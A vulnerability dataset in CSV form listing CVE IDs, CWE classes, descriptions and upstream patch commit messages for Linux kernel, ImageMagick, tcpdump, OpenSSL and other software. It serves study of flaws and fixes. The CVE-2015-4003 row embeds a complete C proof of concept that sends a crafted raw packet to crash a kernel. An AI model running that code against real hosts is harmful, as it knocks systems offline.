CVE-2018-0735,CWE-327,2018-10-29,The OpenSSL ECDSA signature algorithm has been shown to be vulnerable to a timing side channel attack. An attacker could use variations in the signing algorithm to recover the private key. Fixed in OpenSSL 1.1.0j (Affected 1.1.0-1.1.0i). Fixed in OpenSSL 1.1.1a (Affected 1.1.1).,
CVE-2017-15368,CWE-125,2017-10-16,The wasm_dis function in libr/asm/arch/wasm/wasm.c in radare2 2.0.0 allows remote attackers to cause a denial of service (stack-based buffer over-read and application crash) or possibly have unspecified other impact via a crafted WASM file that triggers an incorrect r_hex_bin2str call.,
CVE-2012-4530,CWE-200,2013-02-18,"The load_script function in fs/binfmt_script.c in the Linux kernel before 3.7.2 does not properly handle recursion, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","If a series of scripts are executed, each triggering module loading via unprintable bytes in the script header, kernel stack contents can leak into the command line.  Normally execution of binfmt_script and binfmt_misc happens recursively. However, when modules are enabled, and unprintable bytes exist in the bprm->buf, execution will restart after attempting to load matching binfmt modules.  Unfortunately, the logic in binfmt_script and binfmt_misc does not expect to get restarted.  They leave bprm->interp pointing to their local stack.  This means on restart bprm->interp is left pointing into unused stack memory which can then be copied into the userspace argv areas.  After additional study, it seems that both recursion and restart remains the desirable way to handle exec with scripts, misc, and modules.  As such, we need to protect the changes to interp.  This changes the logic to require allocation for any changes to the bprm->interp.  To avoid adding a new kmalloc to every exec, the default value is left as-is.  Only when passing through binfmt_script or binfmt_misc does an allocation take place.  For a proof of concept, see DoTest.sh from:     http://www.halfdog.net/Security/2012/LinuxKernelBinfmtScriptStackDataDisclosure/  Signed-off-by: Kees Cook <keescook@chromium.org> Cc: halfdog <me@halfdog.net> Cc: P J P <ppandit@redhat.com> Cc: Alexander Viro <viro@zeniv.linux.org.uk> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-6396,CWE-119,2014-12-19,"The dissector_postgresql function in dissectors/ec_postgresql.c in Ettercap before 0.8.1 allows remote attackers to cause a denial of service and possibly execute arbitrary code via a crafted password length, which triggers a 0 character to be written to an arbitrary memory location.",
CVE-2018-11377,CWE-125,2018-05-22,The avr_op_analyze() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.,
CVE-2015-4003,CWE-189,2015-06-07,The oz_usb_handle_ep_data function in drivers/staging/ozwpan/ozusbsvc1.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via a crafted packet.,"A network supplied parameter was not checked before division, leading to a divide-by-zero. Since this happens in the softirq path, it leads to a crash. A PoC follows below, which requires the ozprotocol.h file from this module.  =-=-=-=-=-=   #include <arpa/inet.h>  #include <linux/if_packet.h>  #include <net/if.h>  #include <netinet/ether.h>  #include <stdio.h>  #include <string.h>  #include <stdlib.h>  #include <endian.h>  #include <sys/ioctl.h>  #include <sys/socket.h>   #define u8 uint8_t  #define u16 uint16_t  #define u32 uint32_t  #define __packed __attribute__((__packed__))  #include ""ozprotocol.h""  static int hex2num(char c) { 	if (c >= '0' && c <= '9') 		return c - '0'; 	if (c >= 'a' && c <= 'f') 		return c - 'a' + 10; 	if (c >= 'A' && c <= 'F') 		return c - 'A' + 10; 	return -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { 	int i; 	for (i = 0; i < 6; i++) { 		int a, b; 		a = hex2num(*txt++); 		if (a < 0) 			return -1; 		b = hex2num(*txt++); 		if (b < 0) 			return -1; 		*addr++ = (a << 4) | b; 		if (i < 5 && *txt++ != ':') 			return -1; 	} 	return 0; }  int main(int argc, char *argv[]) { 	if (argc < 3) { 		fprintf(stderr, ""Usage: %s interface destination_mac\n"", argv[0]); 		return 1; 	}  	uint8_t dest_mac[6]; 	if (hwaddr_aton(argv[2], dest_mac)) { 		fprintf(stderr, ""Invalid mac address.\n""); 		return 1; 	}  	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); 	if (sockfd < 0) { 		perror(""socket""); 		return 1; 	}  	struct ifreq if_idx; 	int interface_index; 	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); 	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { 		perror(""SIOCGIFINDEX""); 		return 1; 	} 	interface_index = if_idx.ifr_ifindex; 	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { 		perror(""SIOCGIFHWADDR""); 		return 1; 	} 	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;  	struct { 		struct ether_header ether_header; 		struct oz_hdr oz_hdr; 		struct oz_elt oz_elt; 		struct oz_elt_connect_req oz_elt_connect_req; 		struct oz_elt oz_elt2; 		struct oz_multiple_fixed oz_multiple_fixed; 	} __packed packet = { 		.ether_header = { 			.ether_type = htons(OZ_ETHERTYPE), 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 		}, 		.oz_hdr = { 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), 			.last_pkt_num = 0, 			.pkt_num = htole32(0) 		}, 		.oz_elt = { 			.type = OZ_ELT_CONNECT_REQ, 			.length = sizeof(struct oz_elt_connect_req) 		}, 		.oz_elt_connect_req = { 			.mode = 0, 			.resv1 = {0}, 			.pd_info = 0, 			.session_id = 0, 			.presleep = 0, 			.ms_isoc_latency = 0, 			.host_vendor = 0, 			.keep_alive = 0, 			.apps = htole16((1 << OZ_APPID_USB) | 0x1), 			.max_len_div16 = 0, 			.ms_per_isoc = 0, 			.up_audio_buf = 0, 			.ms_per_elt = 0 		}, 		.oz_elt2 = { 			.type = OZ_ELT_APP_DATA, 			.length = sizeof(struct oz_multiple_fixed) 		}, 		.oz_multiple_fixed = { 			.app_id = OZ_APPID_USB, 			.elt_seq_num = 0, 			.type = OZ_USB_ENDPOINT_DATA, 			.endpoint = 0, 			.format = OZ_DATA_F_MULTIPLE_FIXED, 			.unit_size = 0, 			.data = {0} 		} 	};  	struct sockaddr_ll socket_address = { 		.sll_ifindex = interface_index, 		.sll_halen = ETH_ALEN, 		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 	};  	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { 		perror(""sendto""); 		return 1; 	} 	return 0; }  Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2010-5329,CWE-399,2017-04-24,"The video_usercopy function in drivers/media/video/v4l2-ioctl.c in the Linux kernel before 2.6.39 relies on the count value of a v4l2_ext_controls data structure to determine a kmalloc size, which might allow local users to cause a denial of service (memory consumption) via a large value.","The two functions are mostly identical. They handle the copy_from_user and copy_to_user operations related with V4L2 ioctls and call the real ioctl handler.  Create a __video_usercopy function that implements the core of video_usercopy and video_ioctl2, and call that function from both.  Signed-off-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com> Acked-by: Hans Verkuil <hverkuil@xs4all.nl> Signed-off-by: Mauro Carvalho Chehab <mchehab@redhat.com>"
CVE-2018-16644,CWE-119,2018-09-06,"There is a missing check for length in the functions ReadDCMImage of coders/dcm.c and ReadPICTImage of coders/pict.c in ImageMagick 7.0.8-11, which allows remote attackers to cause a denial of service via a crafted image.",
CVE-2017-13013,CWE-125,2017-09-14,"The ARP parser in tcpdump before 4.9.2 has a buffer over-read in print-arp.c, several functions.","If the protocol type isn't ETHERTYPE_IP or ETHERTYPE_TRAIL, or if the protocol address length isn't 4, don't print the address as an IPv4 address.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture.  Update another test file's tcpdump output to reflect this change."
CVE-2017-13036,CWE-125,2017-09-14,The OSPFv3 parser in tcpdump before 4.9.2 has a buffer over-read in print-ospf6.c:ospf6_decode_v3().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2013-7281,CWE-200,2014-01-08,"The dgram_recvmsg function in net/ieee802154/dgram.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel stack memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","Only update *addr_len when we actually fill in sockaddr, otherwise we can return uninitialized memory from the stack to the caller in the recvfrom, recvmmsg and recvmsg syscalls. Drop the the (addr_len == NULL) checks because we only get called with a valid addr_len pointer either from sock_common_recvmsg or inet_recvmsg.  If a blocking read waits on a socket which is concurrently shut down we now return zero and set msg_msgnamelen to 0.  Reported-by: mpb <mpb.mail@gmail.com> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-1335,CWE-59,2015-10-01,lxc-start in lxc before 1.0.8 and 1.1.x before 1.1.4 allows local container administrators to escape AppArmor confinement via a symlink attack on a (1) mount target or (2) bind mount source.,"When a container starts up, lxc sets up the container's inital fstree by doing a bunch of mounting, guided by the container configuration file.  The container config is owned by the admin or user on the host, so we do not try to guard against bad entries.  However, since the mount target is in the container, it's possible that the container admin could divert the mount with symbolic links.  This could bypass proper container startup (i.e. confinement of a root-owned container by the restrictive apparmor policy, by diverting the required write to /proc/self/attr/current), or bypass the (path-based) apparmor policy by diverting, say, /proc to /mnt in the container.  To prevent this,  1. do not allow mounts to paths containing symbolic links  2. do not allow bind mounts from relative paths containing symbolic links.  Details:  Define safe_mount which ensures that the container has not inserted any symbolic links into any mount targets for mounts to be done during container setup.  The host's mount path may contain symbolic links.  As it is under the control of the administrator, that's ok.  So safe_mount begins the check for symbolic links after the rootfs->mount, by opening that directory.  It opens each directory along the path using openat() relative to the parent directory using O_NOFOLLOW.  When the target is reached, it mounts onto /proc/self/fd/<targetfd>.  Use safe_mount() in mount_entry(), when mounting container proc, and when needed.  In particular, safe_mount() need not be used in any case where:  1. the mount is done in the container's namespace 2. the mount is for the container's rootfs 3. the mount is relative to a tmpfs or proc/sysfs which we have    just safe_mount()ed ourselves  Since we were using proc/net as a temporary placeholder for /proc/sys/net during container startup, and proc/net is a symbolic link, use proc/tty instead.  Update the lxc.container.conf manpage with details about the new restrictions.  Finally, add a testcase to test some symbolic link possibilities.  Reported-by: Roman Fiedler Signed-off-by: Serge Hallyn <serge.hallyn@ubuntu.com> Acked-by: Stéphane Graber <stgraber@ubuntu.com>"
CVE-2014-8324,CWE-20,2017-10-17,network.c in Aircrack-ng before 1.2 Beta 3 allows remote attackers to cause a denial of service (segmentation fault) via a response with a crafted length parameter.,git-svn-id: http://svn.aircrack-ng.org/trunk@2419 28c6078b-6c39-48e3-add9-af49d547ecab
CVE-2011-3619,CWE-20,2013-06-08,"The apparmor_setprocattr function in security/apparmor/lsm.c in the Linux kernel before 3.0 does not properly handle invalid parameters, which allows local users to cause a denial of service (NULL pointer dereference and OOPS) or possibly have unspecified other impact by writing to a /proc/#####/attr/current file.",When invalid parameters are passed to apparmor_setprocattr a NULL deref oops occurs when it tries to record an audit message. This is because it is passing NULL for the profile parameter for aa_audit. But aa_audit now requires that the profile passed is not NULL.  Fix this by passing the current profile on the task that is trying to setprocattr.  Signed-off-by: Kees Cook <kees@ubuntu.com> Signed-off-by: John Johansen <john.johansen@canonical.com> Cc: stable@kernel.org Signed-off-by: James Morris <jmorris@namei.org>
CVE-2017-9949,CWE-787,2017-06-26,"The grub_memmove function in shlr/grub/kern/misc.c in radare2 1.5.0 allows remote attackers to cause a denial of service (stack-based buffer underflow and application crash) or possibly have unspecified other impact via a crafted binary file, possibly related to a buffer underflow in fs/ext2.c in GNU GRUB 2.02.",
CVE-2018-16749,CWE-476,2018-09-09,"In ImageMagick 7.0.7-29 and earlier, a missing NULL check in ReadOneJNGImage in coders/png.c allows an attacker to cause a denial of service (WriteBlob assertion failure and application exit) via a crafted file.",
CVE-2012-6544,CWE-200,2013-03-15,"The Bluetooth protocol stack in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application that targets the (1) L2CAP or (2) HCI implementation.",The HCI code fails to initialize the hci_channel member of struct sockaddr_hci and that for leaks two bytes kernel stack via the getsockname() syscall. Initialize hci_channel with 0 to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2017-13039,CWE-125,2017-09-14,"The ISAKMP parser in tcpdump before 4.9.2 has a buffer over-read in print-isakmp.c, several functions.","Have ikev1_attrmap_print() and ikev1_attr_print() do full bounds checking, and return null on a bounds overflow.  Have their callers check for a null return.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2014-8369,CWE-119,2014-11-10,"The kvm_iommu_map_pages function in virt/kvm/iommu.c in the Linux kernel through 3.17.2 miscalculates the number of pages during the handling of a mapping failure, which allows guest OS users to cause a denial of service (host OS page unpinning) or possibly have unspecified other impact by leveraging guest OS privileges.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2014-3601.","The third parameter of kvm_unpin_pages() when called from kvm_iommu_map_pages() is wrong, it should be the number of pages to un-pin and not the page size.  This error was facilitated with an inconsistent API: kvm_pin_pages() takes a size, but kvn_unpin_pages() takes a number of pages, so fix the problem by matching the two.  This was introduced by commit 350b8bd (""kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-3601)""), which fixes the lack of un-pinning for pages intended to be un-pinned (i.e. memory leak) but unfortunately potentially aggravated the number of pages we un-pin that should have stayed pinned. As far as I understand though, the same practical mitigations apply.  This issue was found during review of Red Hat 6.6 patches to prepare Ksplice rebootless updates.  Thanks to Vegard for his time on a late Friday evening to help me in understanding this code.  Fixes: 350b8bd (""kvm: iommu: fix the third parameter of... (CVE-2014-3601)"") Cc: stable@vger.kernel.org Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Signed-off-by: Jamie Iles <jamie.iles@oracle.com> Reviewed-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2016-7520,CWE-125,2017-04-20,Heap-based buffer overflow in coders/hdr.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted HDR file.,
CVE-2016-3699,CWE-264,2016-10-07,"The Linux kernel, as used in Red Hat Enterprise Linux 7.2 and Red Hat Enterprise MRG 2 and when booted with UEFI Secure Boot enabled, allows local users to bypass intended Secure Boot restrictions and execute untrusted code by appending ACPI tables to the initrd.","From the kernel documentation (initrd_table_override.txt):    If the ACPI_INITRD_TABLE_OVERRIDE compile option is true, it is possible   to override nearly any ACPI table provided by the BIOS with an   instrumented, modified one.  When securelevel is set, the kernel should disallow any unauthenticated changes to kernel space. ACPI tables contain code invoked by the kernel, so do not allow ACPI tables to be overridden if securelevel is set.  Signed-off-by: Linn Crosetto <linn@hpe.com>"
CVE-2014-1690,CWE-200,2014-02-28,The help function in net/netfilter/nf_nat_irc.c in the Linux kernel before 3.12.8 allows remote attackers to obtain sensitive information from kernel memory by establishing an IRC DCC session in which incorrect packet data is transmitted during use of the NAT mangle feature.,"Commit 5901b6b attempted to introduce IPv6 support into IRC NAT helper. By doing so, the following code seemed to be removed by accident:    ip = ntohl(exp->master->tuplehash[IP_CT_DIR_REPLY].tuple.dst.u3.ip);   sprintf(buffer, ""%u %u"", ip, port);   pr_debug(""nf_nat_irc: inserting '%s' == %pI4, port %u\n"", buffer, &ip, port);  This leads to the fact that buffer[] was left uninitialized and contained some stack value. When we call nf_nat_mangle_tcp_packet(), we call strlen(buffer) on excatly this uninitialized buffer. If we are unlucky and the skb has enough tailroom, we overwrite resp. leak contents with values that sit on our stack into the packet and send that out to the receiver.  Since the rather informal DCC spec [1] does not seem to specify IPv6 support right now, we log such occurences so that admins can act accordingly, and drop the packet. I've looked into XChat source, and IPv6 is not supported there: addresses are in u32 and print via %u format string.  Therefore, restore old behaviour as in IPv4, use snprintf(). The IRC helper does not support IPv6 by now. By this, we can safely use strlen(buffer) in nf_nat_mangle_tcp_packet() and prevent a buffer overflow. Also simplify some code as we now have ct variable anyway.    [1] http://www.irchelp.org/irchelp/rfc/ctcpspec.html  Fixes: 5901b6b (""netfilter: nf_nat: support IPv6 in IRC NAT helper"") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Harald Welte <laforge@gnumonks.org> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2015-3194,CWE-476,2015-12-06,crypto/rsa/rsa_ameth.c in OpenSSL 1.0.1 before 1.0.1q and 1.0.2 before 1.0.2e allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via an RSA PSS ASN.1 signature that lacks a mask generation function parameter.,
CVE-2013-3229,CWE-200,2013-04-22,"The iucv_sock_recvmsg function in net/iucv/af_iucv.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","The current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.  Fix that by simply setting msg_namelen to 0 as obviously nobody cared about iucv_sock_recvmsg() not filling the msg_name in case it was set.  Cc: Ursula Braun <ursula.braun@de.ibm.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-13139,CWE-125,2017-08-23,"In ImageMagick before 6.9.9-0 and 7.x before 7.0.6-1, the ReadOneMNGImage function in coders/png.c has an out-of-bounds read with the MNG CLIP chunk.",
CVE-2017-7191,CWE-416,2017-03-27,The netjoin processing in Irssi 1.x before 1.0.2 allows attackers to cause a denial of service (use-after-free) and possibly execute arbitrary code via unspecified vectors.,"fe-netjoin: remove irc servers on ""server disconnected"" signal  Closes #7  See merge request !10"
CVE-2008-1950,CWE-189,2008-05-21,"Integer signedness error in the _gnutls_ciphertext2compressed function in lib/gnutls_cipher.c in libgnutls in GnuTLS before 2.2.4 allows remote attackers to cause a denial of service (buffer over-read and crash) via a certain integer value in the Random field in an encrypted Client Hello message within a TLS record with an invalid Record Length, which leads to an invalid cipher padding length, aka GNUTLS-SA-2008-1-3.",
CVE-2017-18216,CWE-476,2018-03-05,"In fs/ocfs2/cluster/nodemanager.c in the Linux kernel before 4.15, local users can cause a denial of service (NULL pointer dereference and BUG) because a required mutex is not used.","The subsystem.su_mutex is required while accessing the item->ci_parent, otherwise, NULL pointer dereference to the item->ci_parent will be triggered in the following situation:  add node                     delete node sys_write  vfs_write   configfs_write_file    o2nm_node_store     o2nm_node_local_write                              do_rmdir                               vfs_rmdir                                configfs_rmdir                                 mutex_lock(&subsys->su_mutex);                                 unlink_obj                                  item->ci_group = NULL;                                  item->ci_parent = NULL; 	 to_o2nm_cluster_from_node 	  node->nd_item.ci_parent->ci_parent 	  BUG since of NULL pointer dereference to nd_item.ci_parent  Moreover, the o2nm_cluster also should be protected by the subsystem.su_mutex.  [alex.chen@huawei.com: v2]   Link: http://lkml.kernel.org/r/59EEAA69.9080703@huawei.com Link: http://lkml.kernel.org/r/59E9B36A.10700@huawei.com Signed-off-by: Alex Chen <alex.chen@huawei.com> Reviewed-by: Jun Piao <piaojun@huawei.com> Reviewed-by: Joseph Qi <jiangqi903@gmail.com> Cc: Mark Fasheh <mfasheh@versity.com> Cc: Joel Becker <jlbec@evilplan.org> Cc: Junxiao Bi <junxiao.bi@oracle.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-0274,CWE-19,2015-03-16,"The XFS implementation in the Linux kernel before 3.15 improperly uses an old size value during remote attribute replacement, which allows local users to cause a denial of service (transaction overrun and data corruption) or possibly gain privileges by leveraging XFS filesystem access.","Commit e461fcb (""xfs: remote attribute lookups require the value length"") passes the remote attribute length in the xfs_da_args structure on lookup so that CRC calculations and validity checking can be performed correctly by related code. This, unfortunately has the side effect of changing the args->valuelen parameter in cases where it shouldn't.  That is, when we replace a remote attribute, the incoming replacement stores the value and length in args->value and args->valuelen, but then the lookup which finds the existing remote attribute overwrites args->valuelen with the length of the remote attribute being replaced. Hence when we go to create the new attribute, we create it of the size of the existing remote attribute, not the size it is supposed to be. When the new attribute is much smaller than the old attribute, this results in a transaction overrun and an ASSERT() failure on a debug kernel:  XFS: Assertion failed: tp->t_blk_res_used <= tp->t_blk_res, file: fs/xfs/xfs_trans.c, line: 331  Fix this by keeping the remote attribute value length separate to the attribute value length in the xfs_da_args structure. The enables us to pass the length of the remote attribute to be removed without overwriting the new attribute's length.  Also, ensure that when we save remote block contexts for a later rename we zero the original state variables so that we don't confuse the state of the attribute to be removes with the state of the new attribute that we just added. [Spotted by Brain Foster.]  Signed-off-by: Dave Chinner <dchinner@redhat.com> Reviewed-by: Brian Foster <bfoster@redhat.com> Signed-off-by: Dave Chinner <david@fromorbit.com>"
CVE-2014-6269,CWE-189,2014-09-30,"Multiple integer overflows in the http_request_forward_body function in proto_http.c in HAProxy 1.5-dev23 before 1.5.4 allow remote attackers to cause a denial of service (crash) via a large stream of data, which triggers a buffer overflow and an out-of-bounds read.",
CVE-2017-12665,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePICTImage in coders/pict.c.,
CVE-2015-1793,CWE-254,2015-07-09,"The X509_verify_cert function in crypto/x509/x509_vfy.c in OpenSSL 1.0.1n, 1.0.1o, 1.0.2b, and 1.0.2c does not properly process X.509 Basic Constraints cA values during identification of alternative certificate chains, which allows remote attackers to spoof a Certification Authority role and trigger unintended certificate verifications via a valid leaf certificate.",
CVE-2016-6130,CWE-362,2016-07-03,"Race condition in the sclp_ctl_ioctl_sccb function in drivers/s390/char/sclp_ctl.c in the Linux kernel before 4.6 allows local users to obtain sensitive information from kernel memory by changing a certain length value, aka a ""double fetch"" vulnerability.","The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to retrieve the sclp request from user space. The first copy_from_user fetches the length of the request which is stored in the first two bytes of the request. The second copy_from_user gets the complete sclp request, but this copies the length field a second time. A malicious user may have changed the length in the meantime.  Reported-by: Pengfei Wang <wpengfeinudt@gmail.com> Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com> Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>"
CVE-2017-5601,CWE-125,2017-01-27,An error in the lha_read_file_header_1() function (archive_read_support_format_lha.c) in libarchive 3.2.2 allows remote attackers to trigger an out-of-bounds read memory access and subsequently cause a crash via a specially crafted archive.,Fixes a heap buffer overflow reported in Secunia SA74169
CVE-2014-5352,,2015-02-19,"The krb5_gss_process_context_token function in lib/gssapi/krb5/process_context_token.c in the libgssapi_krb5 library in MIT Kerberos 5 (aka krb5) through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 does not properly maintain security-context handles, which allows remote authenticated users to cause a denial of service (use-after-free and double free, and daemon crash) or possibly execute arbitrary code via crafted GSSAPI traffic, as demonstrated by traffic to kadmind.","[MITKRB5-SA-2015-001] The krb5 gss_process_context_token() should not actually delete the context; that leaves the caller with a dangling pointer and no way to know that it is invalid.  Instead, mark the context as terminated, and check for terminated contexts in the GSS functions which expect established contexts.  Also add checks in export_sec_context and pseudo_random, and adjust t_prf.c for the pseudo_random check.  ticket: 8055 (new) target_version: 1.13.1 tags: pullup"
CVE-2015-6520,CWE-264,2015-09-01,"IPPUSBXD before 1.22 listens on all interfaces, which allows remote attackers to obtain access to USB connected printers via a direct request.","Before, any machine in any network connected by any of the interfaces (as listed by ""ifconfig"") could access to an IPP-over-USB printer on the assigned port, allowing users on remote machines to print and to access the web configuration interface of a IPP-over-USB printer in contrary to conventional USB printers which are only accessible locally."
CVE-2013-3237,CWE-200,2013-04-22,"The vsock_stream_sendmsg function in net/vmw_vsock/af_vsock.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","The code misses to update the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.  Cc: Andy King <acking@vmware.com> Cc: Dmitry Torokhov <dtor@vmware.com> Cc: George Zhang <georgezhang@vmware.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-8966,CWE-264,2016-12-08,"arch/arm/kernel/sys_oabi-compat.c in the Linux kernel before 4.4 allows local users to gain privileges via a crafted (1) F_OFD_GETLK, (2) F_OFD_SETLK, or (3) F_OFD_SETLKW command in an fcntl64 system call.",Cc: stable@vger.kernel.org # 3.15+ Reviewed-by: Jeff Layton <jeff.layton@primarydata.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>
CVE-2017-18193,CWE-119,2018-02-22,"fs/f2fs/extent_cache.c in the Linux kernel before 4.13 mishandles extent trees, which allows local users to cause a denial of service (BUG) via an application with multiple threads.","Thread A:					Thread B:  -f2fs_remount     -sbi->mount_opt.opt = 0; 						<--- -f2fs_iget 						         -do_read_inode 							     -f2fs_init_extent_tree 							         -F2FS_I(inode)->extent_tree is NULL         -default_options && parse_options 	    -remount return 						<---  -f2fs_map_blocks 						          -f2fs_lookup_extent_tree                                                               -f2fs_bug_on(sbi, !et);  The same problem with f2fs_new_inode.  Signed-off-by: Yunlei He <heyunlei@huawei.com> Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>"
CVE-2017-18509,CWE-20,2019-08-13,"An issue was discovered in net/ipv6/ip6mr.c in the Linux kernel before 4.11. By setting a specific socket option, an attacker can control a pointer in kernel land and cause an inet_csk_listen_stop general protection fault, or potentially execute arbitrary code under certain circumstances. The issue can be triggered as root (e.g., inside a default LXC container or with the CAP_NET_ADMIN capability) or after namespace unsharing. This occurs because sk_type and protocol are not checked in the appropriate part of the ip6_mroute_* functions. NOTE: this affects Linux distributions that use 4.9.x longterm kernels before 4.9.187.","Commit 5e1859f (""ipv4: ipmr: various fixes and cleanups"") fixed the issue for ipv4 ipmr:    ip_mroute_setsockopt() & ip_mroute_getsockopt() should not   access/set raw_sk(sk)->ipmr_table before making sure the socket   is a raw socket, and protocol is IGMP  The same fix should be done for ipv6 ipmr as well.  This patch can fix the panic caused by overwriting the same offset as ipmr_table as in raw_sk(sk) when accessing other type's socket by ip_mroute_setsockopt().  Signed-off-by: Xin Long <lucien.xin@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-13223,CWE-617,2019-08-15,A reachable assertion in the lookup1_values function in stb_vorbis through 2019-03-04 allows an attacker to cause a denial of service by opening a crafted Ogg Vorbis file.,CVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()
CVE-2017-6074,CWE-415,2017-02-18,"The dccp_rcv_state_process function in net/dccp/input.c in the Linux kernel through 4.9.11 mishandles DCCP_PKT_REQUEST packet data structures in the LISTEN state, which allows local users to obtain root privileges or cause a denial of service (double free) via an application that makes an IPV6_RECVPKTINFO setsockopt system call.","In the current DCCP implementation an skb for a DCCP_PKT_REQUEST packet is forcibly freed via __kfree_skb in dccp_rcv_state_process if dccp_v6_conn_request successfully returns.  However, if IPV6_RECVPKTINFO is set on a socket, the address of the skb is saved to ireq->pktopts and the ref count for skb is incremented in dccp_v6_conn_request, so skb is still in use. Nevertheless, it gets freed in dccp_rcv_state_process.  Fix by calling consume_skb instead of doing goto discard and therefore calling __kfree_skb.  Similar fixes for TCP:  fb7e239 [TCP]: skb is unexpectedly freed. 0aea76d tcp: SYN packets are now simply consumed  Signed-off-by: Andrey Konovalov <andreyknvl@google.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-7515,CWE-476,2016-04-27,The aiptek_probe function in drivers/input/tablet/aiptek.c in the Linux kernel before 4.4 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted USB device that lacks endpoints.,The aiptek driver crashes in aiptek_probe() when a specially crafted USB device without endpoints is detected. This fix adds a check that the device has proper configuration expected by the driver. Also an error return value is changed to more matching one in one of the error paths.  Reported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>
